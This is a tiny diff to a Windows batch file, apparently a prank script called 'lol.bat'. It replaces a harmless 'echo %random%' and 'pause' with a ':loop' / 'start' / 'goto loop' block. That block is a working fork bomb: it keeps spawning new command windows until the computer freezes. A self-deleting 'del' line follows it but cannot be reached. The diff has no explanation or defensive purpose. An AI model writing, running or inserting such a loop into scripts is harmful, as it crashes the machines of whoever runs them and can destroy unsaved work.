@@ -1,4 +1,5 @@
 @echo off
-echo %random%
-pause
+:loop
+start
+goto loop
 del "lol.bat"
